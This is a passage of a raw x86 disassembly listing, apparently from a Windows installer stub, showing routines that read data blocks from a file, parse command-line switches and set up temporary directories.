  4032bf:	eb 41                	jmp    0x403302
  4032c1:	f6 45 dc 01          	testb  $0x1,-0x24(%ebp)
  4032c5:	89 35 74 a2 42 00    	mov    %esi,0x42a274
  4032cb:	8b 06                	mov    (%esi),%eax
  4032cd:	a3 7c a2 42 00       	mov    %eax,0x42a27c
  4032d2:	74 06                	je     0x4032da
  4032d4:	ff 05 80 a2 42 00    	incl   0x42a280
  4032da:	6a 08                	push   $0x8
  4032dc:	8d 46 44             	lea    0x44(%esi),%eax
  4032df:	59                   	pop    %ecx
  4032e0:	83 e8 08             	sub    $0x8,%eax
  4032e3:	01 30                	add    %esi,(%eax)
  4032e5:	49                   	dec    %ecx
  4032e6:	75 f8                	jne    0x4032e0
  4032e8:	a1 f4 0e 42 00       	mov    0x420ef4,%eax
  4032ed:	6a 40                	push   $0x40
  4032ef:	89 46 3c             	mov    %eax,0x3c(%esi)
  4032f2:	83 c6 04             	add    $0x4,%esi
  4032f5:	56                   	push   %esi
  4032f6:	68 a0 a2 42 00       	push   $0x42a2a0
  4032fb:	e8 ed 2c 00 00       	call   0x405fed
  403300:	33 c0                	xor    %eax,%eax
  403302:	5f                   	pop    %edi
  403303:	5e                   	pop    %esi
  403304:	5b                   	pop    %ebx
  403305:	c9                   	leave
  403306:	c2 04 00             	ret    $0x4
  403309:	55                   	push   %ebp
  40330a:	8b ec                	mov    %esp,%ebp
  40330c:	51                   	push   %ecx
  40330d:	8b 45 08             	mov    0x8(%ebp),%eax
  403310:	53                   	push   %ebx
  403311:	56                   	push   %esi
  403312:	33 f6                	xor    %esi,%esi
  403314:	3b c6                	cmp    %esi,%eax
  403316:	7c 1c                	jl     0x403334
  403318:	8b 0d d8 a2 42 00    	mov    0x42a2d8,%ecx
  40331e:	56                   	push   %esi
  40331f:	03 c1                	add    %ecx,%eax
  403321:	56                   	push   %esi
  403322:	50                   	push   %eax
  403323:	a3 f4 0e 42 00       	mov    %eax,0x420ef4
  403328:	ff 35 1c a0 40 00    	push   0x40a01c
  40332e:	ff 15 60 81 40 00    	call   *0x408160
  403334:	6a 04                	push   $0x4
  403336:	e8 d6 00 00 00       	call   0x403411
  40333b:	3b c6                	cmp    %esi,%eax
  40333d:	0f 8c c8 00 00 00    	jl     0x40340b
  403343:	8d 45 08             	lea    0x8(%ebp),%eax
  403346:	6a 04                	push   $0x4
  403348:	50                   	push   %eax
  403349:	ff 35 1c a0 40 00    	push   0x40a01c
  40334f:	e8 61 2d 00 00       	call   0x4060b5
  403354:	85 c0                	test   %eax,%eax
  403356:	0f 84 9f 00 00 00    	je     0x4033fb
  40335c:	ff 75 08             	push   0x8(%ebp)
  40335f:	83 05 f4 0e 42 00 04 	addl   $0x4,0x420ef4
  403366:	e8 a6 00 00 00       	call   0x403411
  40336b:	8b d8                	mov    %eax,%ebx
  40336d:	3b de                	cmp    %esi,%ebx
  40336f:	0f 8c 94 00 00 00    	jl     0x403409
  403375:	39 75 10             	cmp    %esi,0x10(%ebp)
  403378:	75 5d                	jne    0x4033d7
  40337a:	39 75 08             	cmp    %esi,0x8(%ebp)
  40337d:	0f 8e 86 00 00 00    	jle    0x403409
  403383:	be f0 4e 41 00       	mov    $0x414ef0,%esi
  403388:	81 7d 08 00 40 00 00 	cmpl   $0x4000,0x8(%ebp)
  40338f:	8b 45 08             	mov    0x8(%ebp),%eax
  403392:	7c 05                	jl     0x403399
  403394:	b8 00 40 00 00       	mov    $0x4000,%eax
  403399:	50                   	push   %eax
  40339a:	56                   	push   %esi
  40339b:	ff 35 1c a0 40 00    	push   0x40a01c
  4033a1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4033a4:	e8 0c 2d 00 00       	call   0x4060b5
  4033a9:	85 c0                	test   %eax,%eax
  4033ab:	74 4e                	je     0x4033fb
  4033ad:	ff 75 fc             	push   -0x4(%ebp)
  4033b0:	56                   	push   %esi
  4033b1:	ff 75 0c             	push   0xc(%ebp)
  4033b4:	e8 2b 2d 00 00       	call   0x4060e4
  4033b9:	85 c0                	test   %eax,%eax
  4033bb:	74 16                	je     0x4033d3
  4033bd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4033c0:	29 45 08             	sub    %eax,0x8(%ebp)
  4033c3:	01 05 f4 0e 42 00    	add    %eax,0x420ef4
  4033c9:	03 d8                	add    %eax,%ebx
  4033cb:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4033cf:	7f b7                	jg     0x403388
  4033d1:	eb 36                	jmp    0x403409
  4033d3:	6a fe                	push   $0xfffffffe
  4033d5:	eb 26                	jmp    0x4033fd
  4033d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4033da:	3b 45 14             	cmp    0x14(%ebp),%eax
  4033dd:	7c 03                	jl     0x4033e2
  4033df:	8b 45 14             	mov    0x14(%ebp),%eax
  4033e2:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4033e5:	56                   	push   %esi
  4033e6:	51                   	push   %ecx
  4033e7:	50                   	push   %eax
  4033e8:	ff 75 10             	push   0x10(%ebp)
  4033eb:	ff 35 1c a0 40 00    	push   0x40a01c
  4033f1:	ff 15 5c 81 40 00    	call   *0x40815c
  4033f7:	85 c0                	test   %eax,%eax
  4033f9:	75 05                	jne    0x403400
  4033fb:	6a fd                	push   $0xfffffffd
  4033fd:	58                   	pop    %eax
  4033fe:	eb 0b                	jmp    0x40340b
  403400:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  403403:	01 1d f4 0e 42 00    	add    %ebx,0x420ef4
  403409:	8b c3                	mov    %ebx,%eax
  40340b:	5e                   	pop    %esi
  40340c:	5b                   	pop    %ebx
  40340d:	c9                   	leave
  40340e:	c2 10 00             	ret    $0x10
  403411:	53                   	push   %ebx
  403412:	55                   	push   %ebp
  403413:	56                   	push   %esi
  403414:	8b 35 f4 0e 42 00    	mov    0x420ef4,%esi
  40341a:	2b 35 60 ce 40 00    	sub    0x40ce60,%esi
  403420:	57                   	push   %edi
  403421:	03 74 24 14          	add    0x14(%esp),%esi
  403425:	ff 15 f8 80 40 00    	call   *0x4080f8
  40342b:	33 db                	xor    %ebx,%ebx
  40342d:	05 f4 01 00 00       	add    $0x1f4,%eax
  403432:	3b f3                	cmp    %ebx,%esi
  403434:	a3 70 a2 42 00       	mov    %eax,0x42a270
  403439:	0f 8e 2a 01 00 00    	jle    0x403569
  40343f:	ff 35 04 0f 42 00    	push   0x420f04
  403445:	e8 46 01 00 00       	call   0x403590
  40344a:	53                   	push   %ebx
  40344b:	53                   	push   %ebx
  40344c:	ff 35 60 ce 40 00    	push   0x40ce60
  403452:	ff 35 1c a0 40 00    	push   0x40a01c
  403458:	ff 15 60 81 40 00    	call   *0x408160
  40345e:	89 35 00 0f 42 00    	mov    %esi,0x420f00
  403464:	89 1d f0 0e 42 00    	mov    %ebx,0x420ef0
  40346a:	bd f0 ce 40 00       	mov    $0x40cef0,%ebp
  40346f:	a1 f8 0e 42 00       	mov    0x420ef8,%eax
  403474:	bf 00 40 00 00       	mov    $0x4000,%edi
  403479:	2b 05 04 0f 42 00    	sub    0x420f04,%eax
  40347f:	3b c7                	cmp    %edi,%eax
  403481:	7f 02                	jg     0x403485
  403483:	8b f8                	mov    %eax,%edi
  403485:	be f0 4e 41 00       	mov    $0x414ef0,%esi
  40348a:	57                   	push   %edi
  40348b:	56                   	push   %esi
  40348c:	e8 e9 00 00 00       	call   0x40357a
  403491:	85 c0                	test   %eax,%eax
  403493:	0f 84 c2 00 00 00    	je     0x40355b
  403499:	01 3d 04 0f 42 00    	add    %edi,0x420f04
  40349f:	89 35 80 ce 40 00    	mov    %esi,0x40ce80
  4034a5:	89 3d 84 ce 40 00    	mov    %edi,0x40ce84
  4034ab:	39 1d 74 a2 42 00    	cmp    %ebx,0x42a274
  4034b1:	74 29                	je     0x4034dc
  4034b3:	39 1d 20 a3 42 00    	cmp    %ebx,0x42a320
  4034b9:	75 21                	jne    0x4034dc
  4034bb:	a1 00 0f 42 00       	mov    0x420f00,%eax
  4034c0:	53                   	push   %ebx
  4034c1:	2b 05 f4 0e 42 00    	sub    0x420ef4,%eax
  4034c7:	2b 44 24 18          	sub    0x18(%esp),%eax
  4034cb:	03 05 60 ce 40 00    	add    0x40ce60,%eax
  4034d1:	a3 f0 0e 42 00       	mov    %eax,0x420ef0
  4034d6:	e8 eb fa ff ff       	call   0x402fc6
  4034db:	59                   	pop    %ecx
  4034dc:	b9 68 ce 40 00       	mov    $0x40ce68,%ecx
  4034e1:	89 2d 88 ce 40 00    	mov    %ebp,0x40ce88
  4034e7:	c7 05 8c ce 40 00 00 	movl   $0x8000,0x40ce8c
  4034ee:	80 00 00 
  4034f1:	e8 b6 35 00 00       	call   0x406aac
  4034f6:	85 c0                	test   %eax,%eax
  4034f8:	7c 6a                	jl     0x403564
  4034fa:	8b 35 88 ce 40 00    	mov    0x40ce88,%esi
  403500:	2b f5                	sub    %ebp,%esi
  403502:	74 21                	je     0x403525
  403504:	56                   	push   %esi
  403505:	55                   	push   %ebp
  403506:	ff 35 1c a0 40 00    	push   0x40a01c
  40350c:	e8 d3 2b 00 00       	call   0x4060e4
  403511:	85 c0                	test   %eax,%eax
  403513:	74 4b                	je     0x403560
  403515:	01 35 60 ce 40 00    	add    %esi,0x40ce60
  40351b:	39 1d 84 ce 40 00    	cmp    %ebx,0x40ce84
  403521:	75 88                	jne    0x4034ab
  403523:	eb 0c                	jmp    0x403531
  403525:	39 1d 84 ce 40 00    	cmp    %ebx,0x40ce84
  40352b:	75 37                	jne    0x403564
  40352d:	3b fb                	cmp    %ebx,%edi
  40352f:	74 33                	je     0x403564
  403531:	a1 f4 0e 42 00       	mov    0x420ef4,%eax
  403536:	8b c8                	mov    %eax,%ecx
  403538:	2b 0d 60 ce 40 00    	sub    0x40ce60,%ecx
  40353e:	03 4c 24 14          	add    0x14(%esp),%ecx
  403542:	85 c9                	test   %ecx,%ecx
  403544:	0f 8f 25 ff ff ff    	jg     0x40346f
  40354a:	53                   	push   %ebx
  40354b:	53                   	push   %ebx
  40354c:	50                   	push   %eax
  40354d:	ff 35 1c a0 40 00    	push   0x40a01c
  403553:	ff 15 60 81 40 00    	call   *0x408160
  403559:	eb 0e                	jmp    0x403569
  40355b:	83 c8 ff             	or     $0xffffffff,%eax
  40355e:	eb 13                	jmp    0x403573
  403560:	6a fe                	push   $0xfffffffe
  403562:	eb 02                	jmp    0x403566
  403564:	6a fd                	push   $0xfffffffd
  403566:	58                   	pop    %eax
  403567:	eb 0a                	jmp    0x403573
  403569:	6a 01                	push   $0x1
  40356b:	e8 56 fa ff ff       	call   0x402fc6
  403570:	59                   	pop    %ecx
  403571:	33 c0                	xor    %eax,%eax
  403573:	5f                   	pop    %edi
  403574:	5e                   	pop    %esi
  403575:	5d                   	pop    %ebp
  403576:	5b                   	pop    %ebx
  403577:	c2 04 00             	ret    $0x4
  40357a:	ff 74 24 08          	push   0x8(%esp)
  40357e:	ff 74 24 08          	push   0x8(%esp)
  403582:	ff 35 18 a0 40 00    	push   0x40a018
  403588:	e8 28 2b 00 00       	call   0x4060b5
  40358d:	c2 08 00             	ret    $0x8
  403590:	6a 00                	push   $0x0
  403592:	6a 00                	push   $0x0
  403594:	ff 74 24 0c          	push   0xc(%esp)
  403598:	ff 35 18 a0 40 00    	push   0x40a018
  40359e:	ff 15 60 81 40 00    	call   *0x408160
  4035a4:	c2 04 00             	ret    $0x4
  4035a7:	56                   	push   %esi
  4035a8:	be 00 78 43 00       	mov    $0x437800,%esi
  4035ad:	56                   	push   %esi
  4035ae:	e8 38 32 00 00       	call   0x4067eb
  4035b3:	56                   	push   %esi
  4035b4:	e8 cf 28 00 00       	call   0x405e88
  4035b9:	85 c0                	test   %eax,%eax
  4035bb:	75 02                	jne    0x4035bf
  4035bd:	5e                   	pop    %esi
  4035be:	c3                   	ret
  4035bf:	56                   	push   %esi
  4035c0:	e8 4c 28 00 00       	call   0x405e11
  4035c5:	56                   	push   %esi
  4035c6:	e8 25 25 00 00       	call   0x405af0
  4035cb:	56                   	push   %esi
  4035cc:	68 00 70 43 00       	push   $0x437000
  4035d1:	e8 8b 2a 00 00       	call   0x406061
  4035d6:	5e                   	pop    %esi
  4035d7:	c3                   	ret
  4035d8:	81 ec d4 02 00 00    	sub    $0x2d4,%esp
  4035de:	53                   	push   %ebx
  4035df:	56                   	push   %esi
  4035e0:	57                   	push   %edi
  4035e1:	6a 20                	push   $0x20
  4035e3:	5f                   	pop    %edi
  4035e4:	33 db                	xor    %ebx,%ebx
  4035e6:	68 01 80 00 00       	push   $0x8001
  4035eb:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4035ef:	c7 44 24 10 30 a2 40 	movl   $0x40a230,0x10(%esp)
  4035f6:	00 
  4035f7:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  4035fb:	ff 15 c8 80 40 00    	call   *0x4080c8
  403601:	ff 15 cc 80 40 00    	call   *0x4080cc
  403607:	25 ff ff ff bf       	and    $0xbfffffff,%eax
  40360c:	66 3d 06 00          	cmp    $0x6,%ax
  403610:	a3 6c a2 42 00       	mov    %eax,0x42a26c
  403615:	74 11                	je     0x403628
  403617:	53                   	push   %ebx
  403618:	e8 14 33 00 00       	call   0x406931
  40361d:	3b c3                	cmp    %ebx,%eax
  40361f:	74 07                	je     0x403628
  403621:	68 00 0c 00 00       	push   $0xc00
  403626:	ff d0                	call   *%eax
  403628:	be b0 82 40 00       	mov    $0x4082b0,%esi
  40362d:	56                   	push   %esi
  40362e:	e8 8e 32 00 00       	call   0x4068c1
  403633:	56                   	push   %esi
  403634:	ff 15 54 81 40 00    	call   *0x408154
  40363a:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  40363e:	80 3e 00             	cmpb   $0x0,(%esi)
  403641:	75 ea                	jne    0x40362d
  403643:	6a 0b                	push   $0xb
  403645:	e8 e7 32 00 00       	call   0x406931
  40364a:	6a 09                	push   $0x9
  40364c:	e8 e0 32 00 00       	call   0x406931
  403651:	6a 07                	push   $0x7
  403653:	a3 64 a2 42 00       	mov    %eax,0x42a264
  403658:	e8 d4 32 00 00       	call   0x406931
  40365d:	3b c3                	cmp    %ebx,%eax
  40365f:	74 0f                	je     0x403670
  403661:	6a 1e                	push   $0x1e
  403663:	ff d0                	call   *%eax
  403665:	85 c0                	test   %eax,%eax
  403667:	74 07                	je     0x403670
  403669:	80 0d 6f a2 42 00 40 	orb    $0x40,0x42a26f
  403670:	55                   	push   %ebp
  403671:	ff 15 38 80 40 00    	call   *0x408038
  403677:	53                   	push   %ebx
  403678:	ff 15 98 82 40 00    	call   *0x408298
  40367e:	a3 38 a3 42 00       	mov    %eax,0x42a338
  403683:	53                   	push   %ebx
  403684:	8d 44 24 34          	lea    0x34(%esp),%eax
  403688:	68 b4 02 00 00       	push   $0x2b4
  40368d:	50                   	push   %eax
  40368e:	53                   	push   %ebx
  40368f:	68 08 17 42 00       	push   $0x421708
  403694:	ff 15 8c 81 40 00    	call   *0x40818c
  40369a:	68 84 a3 40 00       	push   $0x40a384
  40369f:	68 60 92 42 00       	push   $0x429260
  4036a4:	e8 93 2e 00 00       	call   0x40653c
  4036a9:	ff 15 d0 80 40 00    	call   *0x4080d0
  4036af:	bd 00 50 43 00       	mov    $0x435000,%ebp
  4036b4:	50                   	push   %eax
  4036b5:	55                   	push   %ebp
  4036b6:	e8 81 2e 00 00       	call   0x40653c
  4036bb:	66 83 3d 00 50 43 00 	cmpw   $0x22,0x435000
  4036c2:	22 
  4036c3:	c7 05 60 a2 42 00 00 	movl   $0x400000,0x42a260
  4036ca:	00 40 00 
  4036cd:	8b c5                	mov    %ebp,%eax
  4036cf:	75 08                	jne    0x4036d9
  4036d1:	6a 22                	push   $0x22
  4036d3:	b8 02 50 43 00       	mov    $0x435002,%eax
  4036d8:	5f                   	pop    %edi
  4036d9:	57                   	push   %edi
  4036da:	50                   	push   %eax
  4036db:	e8 5e 27 00 00       	call   0x405e3e
  4036e0:	50                   	push   %eax
  4036e1:	ff 15 30 82 40 00    	call   *0x408230
  4036e7:	8b c8                	mov    %eax,%ecx
  4036e9:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4036ed:	66 8b 01             	mov    (%ecx),%ax
  4036f0:	66 3b c3             	cmp    %bx,%ax
  4036f3:	0f 84 11 01 00 00    	je     0x40380a
  4036f9:	6a 20                	push   $0x20
  4036fb:	5b                   	pop    %ebx
  4036fc:	66 3b c3             	cmp    %bx,%ax
  4036ff:	75 07                	jne    0x403708
  403701:	41                   	inc    %ecx
  403702:	41                   	inc    %ecx
  403703:	66 39 19             	cmp    %bx,(%ecx)
  403706:	74 f9                	je     0x403701
  403708:	66 83 39 22          	cmpw   $0x22,(%ecx)
  40370c:	75 05                	jne    0x403713
  40370e:	41                   	inc    %ecx
  40370f:	6a 22                	push   $0x22
  403711:	41                   	inc    %ecx
  403712:	5b                   	pop    %ebx
  403713:	66 83 39 2f          	cmpw   $0x2f,(%ecx)
  403717:	0f 85 b9 00 00 00    	jne    0x4037d6
  40371d:	41                   	inc    %ecx
  40371e:	41                   	inc    %ecx
  40371f:	66 83 39 53          	cmpw   $0x53,(%ecx)
  403723:	75 19                	jne    0x40373e
  403725:	66 8b 41 02          	mov    0x2(%ecx),%ax
  403729:	66 3d 20 00          	cmp    $0x20,%ax
  40372d:	74 05                	je     0x403734
  40372f:	66 85 c0             	test   %ax,%ax
  403732:	75 0a                	jne    0x40373e
  403734:	c7 05 20 a3 42 00 01 	movl   $0x1,0x42a320
  40373b:	00 00 00 
  40373e:	0f b7 05 7e a3 40 00 	movzwl 0x40a37e,%eax
  403745:	99                   	cltd
  403746:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  40374a:	c1 e0 10             	shl    $0x10,%eax
  40374d:	8b f8                	mov    %eax,%edi
  40374f:	33 f6                	xor    %esi,%esi
  403751:	0f b7 05 7c a3 40 00 	movzwl 0x40a37c,%eax
  403758:	99                   	cltd
  403759:	0f b7 15 78 a3 40 00 	movzwl 0x40a378,%edx
  403760:	0b f8                	or     %eax,%edi
  403762:	0f b7 05 7a a3 40 00 	movzwl 0x40a37a,%eax
  403769:	c1 e0 10             	shl    $0x10,%eax
  40376c:	0b c2                	or     %edx,%eax
  40376e:	99                   	cltd
  40376f:	0b f0                	or     %eax,%esi
  403771:	8b 01                	mov    (%ecx),%eax
  403773:	0b fa                	or     %edx,%edi
  403775:	3b c6                	cmp    %esi,%eax
  403777:	75 1b                	jne    0x403794
  403779:	8b 41 04             	mov    0x4(%ecx),%eax
  40377c:	3b c7                	cmp    %edi,%eax
  40377e:	75 14                	jne    0x403794
  403780:	66 8b 41 08          	mov    0x8(%ecx),%ax
  403784:	66 3d 20 00          	cmp    $0x20,%ax
  403788:	74 05                	je     0x40378f
  40378a:	66 85 c0             	test   %ax,%ax
  40378d:	75 05                	jne    0x403794
  40378f:	83 4c 24 1c 04       	orl    $0x4,0x1c(%esp)
  403794:	0f b7 05 72 a3 40 00 	movzwl 0x40a372,%eax
  40379b:	99                   	cltd
  40379c:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  4037a0:	c1 e0 10             	shl    $0x10,%eax
  4037a3:	8b f8                	mov    %eax,%edi
  4037a5:	33 f6                	xor    %esi,%esi
  4037a7:	0f b7 05 70 a3 40 00 	movzwl 0x40a370,%eax
  4037ae:	99                   	cltd
  4037af:	0f b7 15 6c a3 40 00 	movzwl 0x40a36c,%edx
  4037b6:	0b f8                	or     %eax,%edi
  4037b8:	0f b7 05 6e a3 40 00 	movzwl 0x40a36e,%eax
  4037bf:	c1 e0 10             	shl    $0x10,%eax
  4037c2:	0b c2                	or     %edx,%eax
  4037c4:	99                   	cltd
  4037c5:	0b f0                	or     %eax,%esi
  4037c7:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4037ca:	0b fa                	or     %edx,%edi
  4037cc:	3b c6                	cmp    %esi,%eax
  4037ce:	75 06                	jne    0x4037d6
  4037d0:	8b 01                	mov    (%ecx),%eax
  4037d2:	3b c7                	cmp    %edi,%eax
  4037d4:	74 1f                	je     0x4037f5
  4037d6:	53                   	push   %ebx
  4037d7:	51                   	push   %ecx
  4037d8:	e8 61 26 00 00       	call   0x405e3e
  4037dd:	8b c8                	mov    %eax,%ecx
  4037df:	66 83 39 22          	cmpw   $0x22,(%ecx)
  4037e3:	75 02                	jne    0x4037e7
  4037e5:	41                   	inc    %ecx
  4037e6:	41                   	inc    %ecx
  4037e7:	66 8b 01             	mov    (%ecx),%ax
  4037ea:	66 85 c0             	test   %ax,%ax
  4037ed:	0f 85 06 ff ff ff    	jne    0x4036f9
  4037f3:	eb 13                	jmp    0x403808
  4037f5:	66 83 61 fc 00       	andw   $0x0,-0x4(%ecx)
  4037fa:	83 c1 04             	add    $0x4,%ecx
  4037fd:	51                   	push   %ecx
  4037fe:	68 00 58 43 00       	push   $0x435800
  403803:	e8 34 2d 00 00       	call   0x40653c
  403808:	33 db                	xor    %ebx,%ebx
  40380a:	8b 3d d4 80 40 00    	mov    0x4080d4,%edi
  403810:	be 00 78 43 00       	mov    $0x437800,%esi
  403815:	56                   	push   %esi
  403816:	68 00 04 00 00       	push   $0x400
  40381b:	ff d7                	call   *%edi
  40381d:	e8 85 fd ff ff       	call   0x4035a7
  403822:	85 c0                	test   %eax,%eax
  403824:	75 56                	jne    0x40387c
  403826:	68 fb 03 00 00       	push   $0x3fb
  40382b:	56                   	push   %esi
  40382c:	ff 15 d8 80 40 00    	call   *0x4080d8
  403832:	68 60 a3 40 00       	push   $0x40a360
  403837:	56                   	push   %esi
  403838:	e8 1b 2d 00 00       	call   0x406558
  40383d:	e8 65 fd ff ff       	call   0x4035a7
  403842:	85 c0                	test   %eax,%eax
  403844:	75 36                	jne    0x40387c
  403846:	56                   	push   %esi
  403847:	68 fc 03 00 00       	push   $0x3fc
  40384c:	ff d7                	call   *%edi
  40384e:	68 58 a3 40 00       	push   $0x40a358
  403853:	56                   	push   %esi
  403854:	e8 ff 2c 00 00       	call   0x406558
  403859:	8b 3d dc 80 40 00    	mov    0x4080dc,%edi
  40385f:	56                   	push   %esi
  403860:	68 4c a3 40 00       	push   $0x40a34c
  403865:	ff d7                	call   *%edi
  403867:	56                   	push   %esi
  403868:	68 44 a3 40 00       	push   $0x40a344
  40386d:	ff d7                	call   *%edi
  40386f:	e8 33 fd ff ff       	call   0x4035a7
  403874:	85 c0                	test   %eax,%eax
  403876:	0f 84 cb 00 00 00    	je     0x403947
  40387c:	68 00 70 43 00       	push   $0x437000
  403881:	ff 15 70 81 40 00    	call   *0x408170
  403887:	ff 74 24 1c          	push   0x1c(%esp)
  40388b:	e8 d8 f7 ff ff       	call   0x403068
  403890:	3b c3                	cmp    %ebx,%eax
  403892:	89 44 24 10          	mov    %eax,0x10(%esp)
  403896:	0f 85 ab 00 00 00    	jne    0x403947
  40389c:	39 1d 80 a2 42 00    	cmp    %ebx,0x42a280
  4038a2:	0f 84 8f 00 00 00    	je     0x403937
  4038a8:	53                   	push   %ebx
  4038a9:	55                   	push   %ebp
  4038aa:	e8 8f 25 00 00       	call   0x405e3e
  4038af:	8b f8                	mov    %eax,%edi
  4038b1:	3b fd                	cmp    %ebp,%edi
  4038b3:	72 4c                	jb     0x403901
  4038b5:	0f b7 05 3e a3 40 00 	movzwl 0x40a33e,%eax
  4038bc:	99                   	cltd
  4038bd:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  4038c1:	c1 e0 10             	shl    $0x10,%eax
  4038c4:	8b d8                	mov    %eax,%ebx
  4038c6:	0f b7 05 3c a3 40 00 	movzwl 0x40a33c,%eax
  4038cd:	0f b7 0d 38 a3 40 00 	movzwl 0x40a338,%ecx
  4038d4:	99                   	cltd
  4038d5:	0b d8                	or     %eax,%ebx
  4038d7:	0f b7 05 3a a3 40 00 	movzwl 0x40a33a,%eax
  4038de:	c1 e0 10             	shl    $0x10,%eax
  4038e1:	0b c1                	or     %ecx,%eax
  4038e3:	33 c9                	xor    %ecx,%ecx
  4038e5:	99                   	cltd
  4038e6:	0b c8                	or     %eax,%ecx
  4038e8:	8b c3                	mov    %ebx,%eax
  4038ea:	0b c2                	or     %edx,%eax
  4038ec:	8b 17                	mov    (%edi),%edx
  4038ee:	3b d1                	cmp    %ecx,%edx
  4038f0:	75 07                	jne    0x4038f9
  4038f2:	8b 57 04             	mov    0x4(%edi),%edx
  4038f5:	3b d0                	cmp    %eax,%edx
  4038f7:	74 06                	je     0x4038ff
  4038f9:	4f                   	dec    %edi
  4038fa:	4f                   	dec    %edi
  4038fb:	3b fd                	cmp    %ebp,%edi
  4038fd:	73 ed                	jae    0x4038ec
  4038ff:	33 db                	xor    %ebx,%ebx
  403901:	3b fd                	cmp    %ebp,%edi
  403903:	c7 44 24 10 b8 a2 40 	movl   $0x40a2b8,0x10(%esp)
  40390a:	00 
  40390b:	72 66                	jb     0x403973
  40390d:	66 89 1f             	mov    %bx,(%edi)
  403910:	83 c7 08             	add    $0x8,%edi
  403913:	57                   	push   %edi
  403914:	e8 00 26 00 00       	call   0x405f19
  403919:	85 c0                	test   %eax,%eax
  40391b:	74 2a                	je     0x403947
  40391d:	57                   	push   %edi
  40391e:	68 00 58 43 00       	push   $0x435800
  403923:	e8 14 2c 00 00       	call   0x40653c
  403928:	57                   	push   %edi
  403929:	68 00 60 43 00       	push   $0x436000
  40392e:	e8 09 2c 00 00       	call   0x40653c
  403933:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403937:	83 0d 2c a3 42 00 ff 	orl    $0xffffffff,0x42a32c
  40393e:	e8 c8 02 00 00       	call   0x403c0b
  403943:	89 44 24 14          	mov    %eax,0x14(%esp)
  403947:	e8 cd 01 00 00       	call   0x403b19
  40394c:	ff 15 9c 82 40 00    	call   *0x40829c
  403952:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  403956:	5d                   	pop    %ebp
  403957:	0f 84 20 01 00 00    	je     0x403a7d
  40395d:	68 10 00 20 00       	push   $0x200010
  403962:	ff 74 24 10          	push   0x10(%esp)
  403966:	e8 37 22 00 00       	call   0x405ba2
  40396b:	6a 02                	push   $0x2
  40396d:	ff 15 e0 80 40 00    	call   *0x4080e0
  403973:	e8 95 21 00 00       	call   0x405b0d
  403978:	68 2c a3 40 00       	push   $0x40a32c
  40397d:	56                   	push   %esi
  40397e:	8b f8                	mov    %eax,%edi
  403980:	e8 d3 2b 00 00       	call   0x406558
  403985:	3b fb                	cmp    %ebx,%edi
  403987:	74 0b                	je     0x403994
  403989:	68 28 a3 40 00       	push   $0x40a328
  40398e:	56                   	push   %esi
  40398f:	e8 c4 2b 00 00       	call   0x406558
  403994:	68 1c a3 40 00       	push   $0x40a31c
  403999:	56                   	push   %esi
  40399a:	e8 b9 2b 00 00       	call   0x406558
  40399f:	bd 00 68 43 00       	mov    $0x436800,%ebp
  4039a4:	55                   	push   %ebp
  4039a5:	56                   	push   %esi
  4039a6:	ff 15 28 81 40 00    	call   *0x408128
  4039ac:	85 c0                	test   %eax,%eax
  4039ae:	74 97                	je     0x403947
  4039b0:	3b fb                	cmp    %ebx,%edi
  4039b2:	56                   	push   %esi
  4039b3:	74 07                	je     0x4039bc
  4039b5:	e8 b9 20 00 00       	call   0x405a73
  4039ba:	eb 05                	jmp    0x4039c1
  4039bc:	e8 2f 21 00 00       	call   0x405af0
  4039c1:	56                   	push   %esi
  4039c2:	ff 15 08 81 40 00    	call   *0x408108
  4039c8:	66 39 1d 00 58 43 00 	cmp    %bx,0x435800
  4039cf:	75 0b                	jne    0x4039dc
  4039d1:	55                   	push   %ebp
  4039d2:	68 00 58 43 00       	push   $0x435800
  4039d7:	e8 60 2b 00 00       	call   0x40653c
  4039dc:	ff 74 24 18          	push   0x18(%esp)
  4039e0:	68 00 b0 42 00       	push   $0x42b000
  4039e5:	e8 52 2b 00 00       	call   0x40653c
  4039ea:	0f b7 05 16 a3 40 00 	movzwl 0x40a316,%eax
  4039f1:	0f b7 0d 14 a3 40 00 	movzwl 0x40a314,%ecx
  4039f8:	c1 e0 10             	shl    $0x10,%eax
  4039fb:	0b c1                	or     %ecx,%eax
  4039fd:	6a 1a                	push   $0x1a
  4039ff:	a3 00 b8 42 00       	mov    %eax,0x42b800
  403a04:	5d                   	pop    %ebp
  403a05:	bf 08 0f 42 00       	mov    $0x420f08,%edi
  403a0a:	a1 74 a2 42 00       	mov    0x42a274,%eax
  403a0f:	ff b0 20 01 00 00    	push   0x120(%eax)
  403a15:	57                   	push   %edi
  403a16:	e8 5e 2b 00 00       	call   0x406579
  403a1b:	57                   	push   %edi
  403a1c:	ff 15 70 81 40 00    	call   *0x408170
  403a22:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  403a26:	74 3f                	je     0x403a67
  403a28:	6a 01                	push   $0x1
  403a2a:	57                   	push   %edi
  403a2b:	68 00 88 43 00       	push   $0x438800
  403a30:	ff 15 e4 80 40 00    	call   *0x4080e4
  403a36:	85 c0                	test   %eax,%eax
  403a38:	74 2d                	je     0x403a67
  403a3a:	53                   	push   %ebx
  403a3b:	57                   	push   %edi
  403a3c:	e8 c1 28 00 00       	call   0x406302
  403a41:	a1 74 a2 42 00       	mov    0x42a274,%eax
  403a46:	ff b0 24 01 00 00    	push   0x124(%eax)
  403a4c:	57                   	push   %edi
  403a4d:	e8 27 2b 00 00       	call   0x406579
  403a52:	57                   	push   %edi
  403a53:	e8 cd 20 00 00       	call   0x405b25
  403a58:	3b c3                	cmp    %ebx,%eax
  403a5a:	74 0b                	je     0x403a67
  403a5c:	50                   	push   %eax
  403a5d:	ff 15 24 81 40 00    	call   *0x408124
  403a63:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403a67:	66 ff 05 00 b8 42 00 	incw   0x42b800
